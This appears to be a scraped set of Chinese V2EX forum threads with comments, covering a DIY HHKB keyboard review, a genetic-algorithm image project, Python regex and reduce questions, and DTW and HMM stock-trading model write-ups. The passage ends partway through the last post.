{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚从某宝入手了一款 diy 的 hhkb 键盘，觉的炒鸡屌，虽然刚开始敲起来和 type-s 差着很远，但是敲快了，红轴如丝的感觉就出来了~~~</p>\n<p><img alt=\"钢板键盘\" src=\"http://ww4.sinaimg.cn/large/64896f19jw1f9m69z2ynjj21be0qojyd.jpg\"></p>\n<p>跟原版的相比，</p>\n<ol>\n<li>按键，感觉要差一些，每个键帽瞅着都很山寨，也没有光滑的手感</li>\n<li>霹雳灯光，加 30 块钱，还能做出杀马特的感觉，后悔没装了</li>\n<li>按键轴， Cherry 红轴是比较推荐的，青轴，黑轴，茶轴都有，刚入手之后还要适应一段时间力道</li>\n<li>钢板，那块钢板瞅着的确很山寨，，同时也很 Geek....</li>\n<li>数据线和 usb 接口，很狂野</li>\n</ol>\n<p><img alt=\"对比图\" src=\"http://ww2.sinaimg.cn/large/64896f19jw1f9m69yrztgj21be0qodnd.jpg\"></p>\n<p>功能方面完全一致，刚开始因为外观有点小失落，\n敲了一段时间之后真的很爽，另外一种奇妙手感，非常异域风情</p>\n<p>双十一的另一种选择，，<a href=\"https://item.taobao.com/item.htm?spm=a1z09.2.0.0.BIMJfG&amp;id=536355398911&amp;_u=91vpdbvc941\" rel=\"nofollow\">商品链接</a>, 程序员对自己的双手好一点</p>\n<hr>\n<p>打广告，招 Python 工程师，数据分析师，投简请到 chenxi@wecash.net~~~</p>\n</div></div>"], "reply": "28", "tittle": "酷炫狂拽屌炸天的钢板 HHKB--程序员送给自己的礼物", "comment": ["问一下是什么公司? 在哪里?技术栈要求?", " ，，，闪银，，可以看域名的，， Python 后台开发，数据分析之类的，例如之前做过类似 BI 系统的那种是很好的，之前做数据清晰跑算法，也是极好的哦", "那个 ow 的键帽是怎么搞到的？", "没 Ctrl 究竟怎么用我一直不懂.", "这个真的很吊。", "相当有意思, 不过由于没有量产价格是感人的... 由于是手工的从第一张图还是能看出来键有一些稀疏不整齐... 不过想法确实很 geek, 可以编程 keyboard layout 更是优势", "入职可以领一个键盘嘛\r", "\r", "这个定制版很吊", " Tab 下面的键不就是 ctrl 么", "哈哈，偶遇当初我的面试官。我也在他家定制了一块 hhkb 键位 gh60 ，无刻，刷了 hhbk 键位，爽！", " 你有没有看清楚最左边的 Tab 和 Shift 中间那个是什么？", " \r", " \r", "\r", "没有去认真看过这个 HHKB 排列的键盘 .\r", "\r", "\r", "原来有商品链接 , 坏了 poker 2 ,前几天打算买新键盘我也看到这家店了里面的东西都不错啊.\r", "\r", "不过后来 poker2 复活了.", " 钢板键盘可以有~~~", " 键帽是单买的，，某宝也有卖，，还有金属 76 ，，，", " 来来来童鞋，既然这么有缘，推荐几个人吧~~", "早就看上了这家店，买过一把之前的 GH60", "讲真 你们真的习惯没有方向键的键盘么…我感觉方向键用的挺多的", " 是有方向键的，而且很合理。。。  Fn+ [/;'  表示上下左右。。。 切换速度更快了", "96 板子 190\r", "100 个 cherry 轴 200\r", "亚克力外壳 30\r", "LED 灯 100  2\r", "\r", "差不多这个价格把，反正我是习惯了 96 键的键盘了", " 这域名真挺像微信...话说闪银是做类似芝麻信用的东西吗", " 感谢解决我心头一大疑惑😂我孤陋寡闻了", " 嗯，也是信用评估类的产品", " 木有事儿，，我入手之前也不知道。。。😂😂😂", "对左上角守望先锋的键帽很感兴趣", "画手都 diy 了，就把蓝牙给加上呗", "好想试下,", "其实就是个 hhkb 配列的 GH60", "～～～", " 那个 usb 线不会很容易掉？换成无线更好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>先上地址：</p>\n<p><a href=\"https://github.com/KIDJourney/ga_circlepuzzle\" rel=\"nofollow\">github</a></p>\n<p>之前看到了一个用三角形和遗传算法去适配图像的项目，感觉挺有意思，但是那个项目代码写的有点乱，就自己重写了一版。</p>\n<p>效果还可以，只是代价函数（大概叫这个？感觉和机器学习里面的 cost function 很像）写的太扯了，导致右边有一块 rgb 非常低（黑色）区域一直优化不掉。</p>\n<p>我在 readme 里面写了扩展方法，你可以用任意图形来代替圆来进行遗传算法。</p>\n<p>觉得有意思就点个星星呗:D</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>无图言X系列吗。。。</p>\n<p><img alt=\"chrome\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/chrome.png\">\n<img alt=\"0.png\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/output/0.png\">\n<img alt=\"8000.png\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/output/8000.png\">\n<img alt=\"16000.png\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/output/16000.png\">\n<img alt=\"24000.png\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/output/24000.png\">\n<img alt=\"32000.png\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/output/32000.png\">\n<img alt=\"40000.png\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/output/40000.png\">\n<img alt=\"48000.png\" src=\"https://raw.githubusercontent.com/KIDJourney/ga_circlepuzzle/master/output/48000.png\"></p>\n</div></div>"], "reply": "15", "tittle": "遗传算法，用圆适配图像", "comment": ["不明觉厉", "看不懂", "原先在 matrix67 看到过一个用三角形逼近蒙娜丽莎的", "你说的函数应该叫适应度函数", " 嗯，多谢科普。因为是直接读的别人代码，觉得思路比较简单，就直接上手写了，没有看相应的定义:D", " 看不懂有意思就行啦", " 补充个链接： ", " Thx\r", "大家都是用多边形，我就写了个用圆的", "看着感觉和级数逼近有点像…\r", "然而我一数学渣渣表示懵逼…", " 你是想说的傅立叶级数？并不一样，做傅立叶变换是完全确定的。遗传算法则更多在于变异这个概念。", "TypeError: object.__new__(ImagingCore) is not safe, use ImagingCore.__new__()\r", "（ deepcopy 引发的问题）\r", "\r", "所以我在 PixelImage.born_a_child 里暂时把 self.image 设置为 None 了。\r", "\r", "莫名想到猴排啊...", " \r", "诶诶？这个错误是怎么报的。", " \r", "我只试过 python3.x 和 pypy ，没有试过其他版本的 python", "我校期末考试题……纸面编程", " \r", "可怕 Q_Q"]},
{"content": ["<div class=\"topic_content\">我发现 V 友很喜欢读和机器学习有关的文章，今天就再写一篇，希望各位海涵。\r<br>\r<br>前言\r<br>Dynamic Time Warping （ DTW ），动态时间规整算法诞生有一定的历史了（日本学者 Itakura 提出），它出现的目的也比较单纯，是一种衡量两个长度不同的时间序列的相似度的方法。 DTW 应用也比较广，主要是在模板匹配中，比如说用在孤立词语音识别（识别两段语音是否表示同一个单词），手势识别，数据挖掘和信息检索等中。\r<br>\r<br>一、 DTW 算法原理\r<br>\r<br>在时间序列中，需要比较相似性的两段时间序列的长度可能并不相等，在语音识别领域表现为不同人的语速不同。而且同一个单词内的不同音素的发音速度也不同，比如有的人会把“ A ”这个音拖得很长，或者把“ i ”发的很短。另外，不同时间序列可能仅仅存在时间轴上的位移，亦即在还原位移的情况下，两个时间序列是一致的。在这些复杂情况下，使用传统的欧几里得距离无法有效地求的两个时间序列之间的距离（或者相似性）。\r<br>DTW 通过把时间序列进行延伸和缩短，来计算两个时间序列性之间的相似性：\r<br>\r<br><a target=\"_blank\" href=\"/i/NrIzqiMxl.png\" title=\"在新窗口打开图片 NrIzqiMxl.png\"><img src=\"//i.v2ex.co/NrIzqiMxl.png\" class=\"embedded_image\"></a>\r<br>如上图所示，上下两条实线代表两个时间序列，时间序列之间的虚线代表两个时间序列之间的相似的点。 DTW 使用所有这些相似点之间的距离的和，称之为归整路径距离(Warp Path Distance)来衡量两个时间序列之间的相似性。\r<br>\r<br>假设下图是两个不同主力期货合约的时间序列，在形态上非常相似，但是这些形态特征点（波峰、波谷）在时间上不能一一对齐，如果用基于欧氏距离的方法来计算两个序列的相似性，会不符合我们的直观认识。但如果匹配时，在序列上容许时间上的伸缩变形，则如下图的对应结果，匹配效果会大大增强，动态时间规整模型提供的就是允许数据在时间轴上伸缩变形的匹配方式。\r<br>由下图可以看到，动态时间规整算法在进行两个序列匹配时，序列中的点不再是一一对应关系， 而是有一对一、一对多和多对一的不同映射。这种时间上的扭曲通过使得序列之间总体的距离最小化来实现。\r<br>具体而言，动态时间规整通过动态规划的方式来获得两个时间序列的时间对应关系，求得序列之间的最小距离。\r<br>\r<br><a target=\"_blank\" href=\"/i/KP4aD9nXl.png\" title=\"在新窗口打开图片 KP4aD9nXl.png\"><img src=\"//i.v2ex.co/KP4aD9nXl.png\" class=\"embedded_image\"></a>\r<br>二、 DTW 计算方法\r<br>\r<br>假设两个多变量时间序列\r<br>\r<br>X={x1,x2,⋯xm}\r<br>X={y1,y2,⋯ym}\r<br>和其中 X 含有 m 个观测样本， Y 含有 n 个观测样本，且每个观测样本 xi ， i=1,2,…,m 和 yj ， j=1,2,…,n 都是 q 维的多变量样本（维度一致）。在定义好多变量样本点 xi 和 yj 之间的距离计算方式 d （ xi ， yi ） 之后，即可计算多变量序列 X 和 Y 的 动态时间规整距离\r<br>Distance(X,Y)=D(m,n)\r<br>DTW 计算步骤如下：\r<br>\r<br>1 、将 i = 0 和 j = 0 时的 D （ i ， j ） 值设置为正无穷大；\r<br>2 、对于 i 从 1 至 m ， j 从 1 至 n ，通过迭代计算：\r<br>dij=d(xi,yj)\r<br>D(i,j)=dij+min{D(i−1,j),D(i,j−1),D(i−1,j−1)}\r<br>\r<br>最终获得的 D(m,n) 即是多变量序列 X 和 Y 的动态时间规整距离。这是一个动态规划问题，可以通过 O （ mnq ） 次计算，获得两个多变量序列的最优匹配（其中 dij=d （ xi ， yi ） 的计算复杂度为 O （ q ） 。\r<br>\r<br><a target=\"_blank\" href=\"/i/iGE07PH6l.png\" title=\"在新窗口打开图片 iGE07PH6l.png\"><img src=\"//i.v2ex.co/iGE07PH6l.png\" class=\"embedded_image\"></a>\r<br>\r<br>单步优化公式为：\r<br>D(i,j)=dij+min{D(i−1,j),D(i,j−1),D(i−1,j−1)}\r<br>其中， D （ i-1 ， j ） 表示 xi-1 与 yj 匹配时的子序列距离, D （ i ， j-1 ） 表示 xi 与 yj-1 匹配时的子序列距离， D （ i-1 ， j-1 ） 表示 xi-1 与 yj-1 匹配时的子序列距离。动态时间规整算法从可能的三种拆分方式里边选择最优的一种，如图下图所示。\r<br>\r<br><a target=\"_blank\" href=\"/i/5I395xTdl.png\" title=\"在新窗口打开图片 5I395xTdl.png\"><img src=\"//i.v2ex.co/5I395xTdl.png\" class=\"embedded_image\"></a>\r<br>与之对比，普通的多变量匹配中不考虑时间的扭曲，因此要求两个序列等长，即 m=n ，计算复杂度为 O （ nq ） 。与普通的多变量时间序列匹配方法相比，动态时间规整可以获得更优的匹配效果，但是需要更长的计算时间。\r<br>在多变量时间序列中， xi 和 yj 都是 q 维的向量， 而且 xi 中的元素是时刻 i 下变量的值， yj 中的元素是时刻 j 下变量的值， d （ xi ， yi ） 即是 i 时刻的 xi 和 j 时刻的 yj 对齐时的距离。向量 xi 和 yj 之间的距离计算方式 d （ xi ， yi ） 可以通过欧氏距离或者马氏距离来计算，以单变量的序列为例\r<br>X={1,4,4,8,3,2,7,9,8,3,1}\r<br>Y={2,3,9,6,2,2,5,8,9,4,3}\r<br>定义\r<br>d(xi,yi)=∣∣xi−yi∣∣\r<br>通过动态时间规整计算两个序列的距离。\r<br>在这里要引入在 GitHub 的一位牛人，谷歌的数据科学家 Mark Regan 写的包\r<br>\r<br>链接： K Nearest Neighbors &amp; Dynamic Time Warping\r<br>\r<br>K Nearest Neighbors &amp; Dynamic Time Warping\r<br>\r<br>When it comes to building a classification algorithm, analysts have a broad range of open source options to choose from. However, for time series classification, there are less out-of-the box solutions.\r<br>I began researching the domain of time series classification and was intrigued by a recommended technique called K Nearest Neighbors and Dynamic Time Warping. A meta analysis completed by Mitsa (2010) suggests that when it comes to timeseries classification, 1 Nearest Neighbor (K=1) and Dynamic Timewarping is very difficult to beat.\r<br>This repo contains a python implementation (and IPython notebook) of KNN &amp; DTW classification algorithm.\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/hiNb2SzDl.png\" title=\"在新窗口打开图片 hiNb2SzDl.png\"><img src=\"//i.v2ex.co/hiNb2SzDl.png\" class=\"embedded_image\"></a>\r<br>以下是具体代码： <a target=\"_blank\" href=\"https://uqer.io/community/share/57b81db5228e5b79a975a23f\" rel=\"nofollow\">https://uqer.io/community/share/57b81db5228e5b79a975a23f</a>\r<br>导出图如下\r<br><a target=\"_blank\" href=\"/i/avVCthR1l.png\" title=\"在新窗口打开图片 avVCthR1l.png\"><img src=\"//i.v2ex.co/avVCthR1l.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/466Ae4Tsl.png\" title=\"在新窗口打开图片 466Ae4Tsl.png\"><img src=\"//i.v2ex.co/466Ae4Tsl.png\" class=\"embedded_image\"></a>\r<br>\r<br><a target=\"_blank\" href=\"/i/iXS4cLsbl.png\" title=\"在新窗口打开图片 iXS4cLsbl.png\"><img src=\"//i.v2ex.co/iXS4cLsbl.png\" class=\"embedded_image\"></a>\r<br>三、 DTW 交易策略\r<br>\r<br>采用日间的股指期货交易。第 t 个交易日的收盘价格和日成交量是一个观测样本\r<br>\r<br>xt=(p(t),v(t))\r<br>需要通过模式识别对持仓至下一个交易日的收益率\r<br>rt=p(t+1)/p(t)−1\r<br>进行估计，以决定当日收盘时的建仓方向。\r<br>对于此前 L 个交易日的收盘价格和日成交量序列\r<br>Xt={xt−L+1,⋯xt−1,xt}\r<br>需要寻找与其相似的历史片段。首先，采用长度为 L 的移动窗口，将历史的行情划分为不同的行情片段，每一个片段为 L 个交易日的量价行情序列，如图下图所示。\r<br>\r<br><a target=\"_blank\" href=\"/i/9y9m7jvGl.png\" title=\"在新窗口打开图片 9y9m7jvGl.png\"><img src=\"//i.v2ex.co/9y9m7jvGl.png\" class=\"embedded_image\"></a>\r<br>\r<br>由于篇幅有限，先转载到这里啦，余下的请看： <a target=\"_blank\" href=\"https://uqer.io/community/share/57b81db5228e5b79a975a23f\" rel=\"nofollow\">https://uqer.io/community/share/57b81db5228e5b79a975a23f</a></div>"], "reply": "4", "tittle": "[动态时间规整算法] 之股指期货交易策略（一）", "comment": ["好高深，留个爪。", "先留个银子，我最近也被动态规划烦得要死，等有空看看思路", "这个 DTW 不就是一个简单的 DP 问题吗？ Sequence Alignment 或者叫做 Edit Distance 。跟 DNA 找相似性的办法一模一样。", "DTW 有个缺陷，只能跟一只股票进行比较，如果跟 K 个股票比较的话时间复杂度是(2^K-1) * N^K ，假设长度都是 N 。看来 DNA 对齐的很多算法都可以拿来做股票分析啊，不知道用 progressive 或者 STAR 算法会有什么效果。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>\"&gt;\"开头的那行是标题，下面 GGCA 之类的是数据。\n需要把文档中所有的标题和数据提取出来，变成两个对应的数组或者 map 。\n该如何写正则表达式呢？</p>\n<pre><code>p = re.compile(r'^\\&gt;.*?$')\nclusters = re.split(p, content)\n</code></pre>\n<p>上面的代码总是不对，请高手出手看看。</p>\n<p>&gt;HSBGPG Human gene for bone gla protein (BGP) (this is name of sequence)\nGGCAGATTCCCCCTAGACCCGCCCGCACCATGGTCAGGCATGCCCCTCCTCATCGCTGGGCACAGCCCAGAGGGT\nATAAACAGTGCTGGAGGCTGGCGGGGCAGGCCAGCTGAGTCCTGAGCAGCAGCCCAGCGCAGCCACCGAGACACC\nATGAGAGCCCTCACACTCCTCGCCCTATTGGCCCTGGCCGCACTTTGCATCGCTGGCCAGGCAGGTGAGTGCCCC\nCACCTCCCCTCAGGCCGCATTGCAGTGGGGGCTGAGAGGAGGAAGCACCATGGCCCACCTCTTCTCACCCCTTTG\n&gt;HSGLTH1 Human theta 1-globin gene\nCCACTGCACTCACCGCACCCGGCCAATTTTTGTGTTTTTAGTAGAGACTAAATACCATATAGTGAACACCTAAGA\nCGGGGGGCCTTGGATCCAGGGCGATTCAGAGGGCCCCGGTCGGAGCTGTCGGAGATTGAGCGCGCGCGGTCCCGG\nGATCTCCGACGAGGCCCTGGACCCCCGGGCGGCGAAGCTGCGGCGCGGCGCCCCCTGGAGGCCGCGGGACCCCTG\nGCCGGTCCGCGCAGGCGCAGCGGGGTCGCAGGGCGCGGCGGGTTCCAGCGCGGGGATGGCGCTGTCCGCGGAGGA\nCCGGGCGCTGGTGCGCGCCCTGTGGAAGAAGCTGGGCAGCAACGTCGGCGTCTACACGACAGAGGCCCTGGAAAG\nGTGCGGCAGGCTGGGCGCCCCCGCCCCCAGGGGCCCTCCCTCCCCAAGCCCCCCGGACGCGCCTCACCCACGTTC\n&gt;comp0_c0_seq1 len=248 path=[418:0-247]\nTATGAGTCCATTATAACAGCCCTAGGACAAACCAGTAAAAAGAGATCTAGCAAAGAGAGT\nTGAGGGCATTTGTATCCAAGGCATTAAAACAGAGATTAAAGAGGATTTAAATAGAAATAT\nTTGATCCCGACAAATACCAAACTAGTAGATGCACCTAAATTAAATAAAGAGCTAGAAGGG</p>\n</div></div>"], "reply": "13", "tittle": "python 正则表达式高手在否？如何非贪婪的用 python split 分离如下文档", "comment": ["我不是 re 高手, 另外不清楚你的标题和数据的规则, 写了一个, 不知道是否是你想的样子:\r", "r'>(.*?)\\n([^>]*)'\r", "\r", "上面的 pattern 假设: \r", "1. 你的标题不强求>必须在每一行的开头(我上面的表达式, 没有在前面加^, 所以没在最开头出现的>也会匹配, 如果要求必须在行首, 可以试一下用 re.MULTILINE)\r", "2. 你的数据里面不能包含>字符   (上面的正则表达式用>做为终止符, 遇到了就不再继续匹配了)\r", "--------\r", "如果发现了错误, 还请帮我指出来, 非常感谢各位.", "1. 上面的 re, 我没有在后面那个 match group 里把\\n 单独拿出来, 如果你的数据里不想在最后有个\\n, 可以把它单独写在()的外面 -->但我看你给的数据中间也是有换行的, 所以我猜其实没什么关系?\r", "2. 这样转换出来是一个 tuple 的 list, 你用 dict comprehension 之类把它转换成 dict 就可以了", "。。。这个是 DNA ？", "试着写了一下，上面的数据应该是没问题。\r", "\r", "re.findall(\">(.*?) ([ACGT ]+)(?= ?)\", data)\r", "\r", "偶数（含 0 ）项是标题，奇数项是数据。", "如果中间分割是换行符的话应该是这样的\r", "\r", "re.findall(\">(.*?)\\n([ACGT\\n]+)\", a)", "1.标题和数据怎样区分的？你的原文没有显示出来\r", "2.数据区结尾就是下个标题的开始么？\r", "3.为什么指定要非贪婪？作业？这个更应该用贪婪\r", "\r", "In [6]: re.findall(r'>(?P<v>.*?)(?P<vv>[A-Z]{10}[^>]*)', content)\r", "Out[6]: \r", "[('HSBGPG Human gene for bone gla protein (BGP) (this is name of sequence) ',\r", "  'GGCAGATTCCCCCTAGACCCGCCCGCACCATGGTCAGGCATGCCCCTCCTCATCGCTGGGCACAGCCCAGAGGGT ATAAACAGTGCTGGAGGCTGGCGGGGCAGGCCAGCTGAGTCCTGAGCAGCAGCCCAGCGCAGCCACCGAGACACC ATGAGAGCCCTCACACTCCTCGCCCTATTGGCCCTGGCCGCACTTTGCATCGCTGGCCAGGCAGGTGAGTGCCCC CACCTCCCCTCAGGCCGCATTGCAGTGGGGGCTGAGAGGAGGAAGCACCATGGCCCACCTCTTCTCACCCCTTTG '),\r", " ('HSGLTH1 Human theta 1-globin gene ',\r", "  'CCACTGCACTCACCGCACCCGGCCAATTTTTGTGTTTTTAGTAGAGACTAAATACCATATAGTGAACACCTAAGA CGGGGGGCCTTGGATCCAGGGCGATTCAGAGGGCCCCGGTCGGAGCTGTCGGAGATTGAGCGCGCGCGGTCCCGG GATCTCCGACGAGGCCCTGGACCCCCGGGCGGCGAAGCTGCGGCGCGGCGCCCCCTGGAGGCCGCGGGACCCCTG GCCGGTCCGCGCAGGCGCAGCGGGGTCGCAGGGCGCGGCGGGTTCCAGCGCGGGGATGGCGCTGTCCGCGGAGGA CCGGGCGCTGGTGCGCGCCCTGTGGAAGAAGCTGGGCAGCAACGTCGGCGTCTACACGACAGAGGCCCTGGAAAG GTGCGGCAGGCTGGGCGCCCCCGCCCCCAGGGGCCCTCCCTCCCCAAGCCCCCCGGACGCGCCTCACCCACGTTC '),\r", " ('comp0_c0_seq1 len=248 path=[418:0-247] ',\r", "  'TATGAGTCCATTATAACAGCCCTAGGACAAACCAGTAAAAAGAGATCTAGCAAAGAGAGT TGAGGGCATTTGTATCCAAGGCATTAAAACAGAGATTAAAGAGGATTTAAATAGAAATAT TTGATCCCGACAAATACCAAACTAGTAGATGCACCTAAATTAAATAAAGAGCTAGAAGGG')]\r", "注释：\r", "1.(?P<变量名>...) 在 findall 中没意义，但在 match 中可以赋值\r", "2.[A-Z]{10} 这个是标题与数据的分界，原题中没有明确规则，所以这里是随便找的，不通用；如果定下规则就取代这个", "补充： findall 中不能使用两个非贪婪*模糊匹配，结果是不可预料的，我觉得这个算是 re 的 bug ， php/js 同样写法是可以预期结果的", "把你的*替换成+就是非贪婪的了\r", "```Python\r", "p = re.compile(r'^\\>.+?$')\r", "clusters = re.split(p, content)\r", "```", "遇到一只生物狗啊，握爪。\r", "\r", "我觉得你可以用 itertools 里面的 groupby 来实现。\r", "\r", "请看下面的 git-gist\r", "\r", "<script src=\"", ".js\"></script>", "一个生物专业的大神从我背后路过让我回复  from Bio import SeqIO ，我什么都不知道。", "cluster = {l[0]: l[1] for l in [s.strip().split(\"\\n\", 1) for s in content.split(\">\")] if len(l) == 2}", "楼主，你这个原文格式很重要啊，我复制下来粘贴到 sublime ，发现明明就是一行数据，用 re 来弄不太靠谱，因为中间的分隔符都是空格\r", "你先以 > 进行 split ，拿到各个块，然后各块按空格 split ，最后一个分组就是你要的数据，之前的就是标题", "re.split() 的结果不会包含分割符，如果需要 titlte 和内容，建议使用 re.finditer, 然后再根据.start(), .end()获取相关的内容。"]},
{"content": ["<div class=\"topic_content\">我有一段代码，如下：\r<br>result = 0\r<br>for item in [3, 2, 5]:\r<br>    result ^= item\r<br>print(result)\r<br>以上这个 for 循环能不能用一个函数，或一个语句就计算出来？</div>"], "reply": "11", "tittle": "Python 遍历一个数组并计算最终结果", "comment": ["print result*reduce(operator.mul, [3,2,5])\r", "这样？", "reduce(operator.ixor,[3,2,5])", "l = [3,2,5]\r", "reduce(lambda x,y:x^y,l)", "好尴尬，刚发出来刷新发现上面有更好的写法", " \r", " \r", "\r", "reduce 在 python 3.5 没有了啊", " 你需要 \r", "from functools import reduce\r", "import operator", "reduce 或者递归", " 惊了，没仔细看发现写的是*...2L 是对的...", "顺便可以了解一些函数式编程的内容", " 感谢\r", " 好厉害！", "reduce"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3><strong>新鲜出品： <a href=\"https://www.ricequant.com/community/topic/822/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/822/?utm_source=v2ex</a></strong></h3>\n<p><strong>1.1 研究概述</strong></p>\n<p>在 Force Avatar\"HMM 在股票上的简单应用\"一文中，利用隐马尔科夫链模型（ Hidden Markov Model, HMM)对沪深 300 指数预测建模，取得了较为理想的效果。本文基于该文章中的源代码，对模型所使用的可观测序列的正态性进行分析和修正，并对隐藏状态数目的选择作了简单的探讨。分析结果表明，对于可观测序列正态性的修正，及合理的隐藏状态数目选择，能够显著提升模型的预测能力。</p>\n<p><strong>2.2 问题分析</strong></p>\n<p>2.1 可观测序列的正态性分析和处理</p>\n<p>在 Force Avatar 的文章中，选取了三个可观测序列（每日最高最低价格的对数差值， 每 5 日的指数对数收益差和每 5 日的指数成交量的对数差）进行可观测序列进行建模，并假设这三个指标服从正态分布。</p>\n<p>在基于正态分布可观测序列的 HMM 模型中，对于参数的估计（概率转移矩阵，概率发射矩阵）和隐藏状态的标注是通过极大似然估计实现的，其最大似然函数表达式中包含了多元正态分布的概率密度函数。如果所选择的可观测序列偏离正态分布，将导致参数估计有偏，和对于隐藏状态的标注出现较高的错误率。</p>\n<p>通过直方图观察所选的三个可观测序列的分布，发现第一个可观测序列（每日最高最低价格的对数差值）较为显著地偏离正态分布。因此对其进行 Box-Cox Transformation 数据转换的方法，使其更接近正态分布。</p>\n<p>此外，在经验协方差矩阵计算过程中，具有较大方差的可观测序列将具有较大的权重。如果可观测序列的单位不同，其方差的差距可能达到数个数量级。这里为了保证所选的可观测序列在建模中具有接近的权重，对其分布进行标准化（均值调整为 0 ，标准差调整为 1 个单位）。</p>\n<p>2.2 隐藏状态数量的选择</p>\n<p>在广发证券的一篇 HMM 模型研究报告中，隐藏状态的数目设定为 3 个。\n探寻西蒙斯投资之道：基于 HMM 模型的周择时策略研究</p>\n<p>文中并未提及选择三个隐藏状态的原因。在 Force Avatar 所提到的 HMM 模型所关心的三个问题中，隐藏状态均假设为已知。由于目前尚未查到关于隐藏状态数目选择的相关研究文献，目前对于隐藏状态对于建模的影响为个人推测：</p>\n<p>以 Force Avatar 一文中用掷骰子作为例子解释 HMM 模型，其中骰子的数目为隐藏状态数目，抛掷结果为可观测序列。如果我们用 3 颗不同的骰子抛掷获得一个观测序列，但在建模中我们假设隐藏状态数目为 5 个，因为 HMM 无法识别隐藏状态的合理数目，因此对于任意给定的隐藏状态数目和初始分布，模型总能通过反复迭代对参数进行估计，和对隐藏状态进行标注。因此我们最终得到的 5 个隐藏状态中，有 3 颗将会对应真骰子，而另外 2 颗则是这 3 颗真骰子线性组合得到的假骰子。</p>\n<p>由于这 2 颗假骰子是真骰子的线性组合，因此它们可能和真骰子以大致相等的概率导致同一观测序列，从而导致隐藏状态的标准错误，和概率转移矩阵和概率发射矩阵参数估计的不稳定。</p>\n<p>对于证券市场来说，隐藏状态有无穷多个。在建模时，我们希望每个隐藏状态有相互独立的特征，保证我们能对市场状态有清楚的判断，作出投资决策。合理隐藏状态的选取是一个较为复杂的问题， HMM 模型对于隐藏状态标注的准确度取决于可观测序列的数目，数据的数量和质量，迭代次数，数据分布的稳定性等多种因素。</p>\n<p>大体上，我们可以认为市场有三种显著不同的特征：快速上升，快速下跌和震荡。直觉上，震荡这种状态最为复杂，可能有不同的亚隐藏状态，例如震荡上升，震荡下跌等等复杂的的市场状态。而在 Force Avatar 得到的结果中，震荡行情中出现多种状态的标注，导致我们无法准确判断隐藏状态对应的含义。因此，在目前的建模中，基于以下理由把隐藏状态设定为 3 个：</p>\n<p>1.1 希望模型能够正确标注快速上升，快速下跌和震荡三种市场状态，并不期望目前的简单模型能够对震荡行情中的复杂状态准确标注。</p>\n<p>2.2 震荡行情所包含的隐藏状态的标注较为复杂，标注的准确率较低，考虑到交易中实际产生的交易费用，我们希望模型标准的隐藏状态的含义是清晰和准确的，而不希望基于不清晰的隐藏状态含义进行交易。</p>\n<p><strong>3.3 结果讨论</strong></p>\n<p>基于以上讨论，在以下的源代码中，我们分别对未修正的可观测序列和修正后的可观测序列进行建模。我们先对 3 隐藏状态 HMM 模型和 6 隐藏状态 HMM 模型进行对比。根据 3 个隐藏状态得到的模型进行交易，在 2013 年初左右收益率即达到 100%， 2014 年初达到 150%，根据 6 个隐藏状态得到的模型进行交易，在 2015 年初左右收益率达到 100%， 2015 年中达到 150%；此外，在 2015 年下半年的股灾中，根据 3 隐藏状态模型进行交易，收益率仍然维持在 200%左右，而根据 3 隐藏状态模型进行交易，收益率仍然跌至 170%左右</p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=Nk_WdZaxM&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111014\"></p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=NkkcObTef&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111014\"></p>\n<p>然后，我们对基于未修正可观测序列的 3 隐藏状态 HMM 模型和基于修正可观测序列的 3 隐藏状态 HMM 模型进行对比。这两个 HMM 模型中均能对快速上升，快速下跌和震荡行情三种市场状态进行较为准确的标准。基于修正可观测序列的 HMM 模型在 2015 年上半年的牛市中收益率达到 300%，远高于基于未修正可观测序列的 HMM 模型的收益率；且在 2015 年下半年的股灾中，基于修正可观测序列的模型表现出色，在稍微回调以后重新上升，在 2015 年年底和其峰值大致持平。</p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=NJrlj-Tgz&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p><img alt=\"\" src=\"http://yotuku.cn/link?url=NJo-iZaeG&amp;tk_plan=free&amp;tk_storage=tietuku&amp;tk_vuid=17bed64a-8af5-4651-aca4-86c2a10936ce&amp;tk_time=2016111015\"></p>\n<p>3.3 研究展望</p>\n<p>在本文中，我们对于 HMM 模型的隐藏状态数目选择进行了讨论，并对所选的可观测序列正态性进行了分析和处理，调整以后的 HMM 对于沪深 300 的测试结果显著改善。</p>\n<p>在下一步的研究中，可以对模型的以下方面作进一步改善：</p>\n<p>1.1 对建模时选择的 2000 步迭代合理性进行检验。理想的迭代数目应该使参数估计和隐藏状态标注的准确性收敛。</p>\n<p>2.2 选择更多的尽可能正交的，符合正态分布可观测序列序列向量作为指标进行建模。理论上，相互正交的可观测序列向量比存在线性相关的可观测序列向量包含更多的市场信息，且和 HMM 模型中的观测独立性假设一致，同时能够降低经验协方差矩阵非对角元素估计的误差。</p>\n<p>3.3 对符合正态分布的可观测序列进行方差分析，判断其可合理使用的时间范围，并通过检验结果进一步了解市场结构的变化。</p>\n<p>通过交叉验证（ Cross-Validation ）进一步确定合理的隐藏状态数目。</p>\n<p>最后，在此对于 Force Avatar 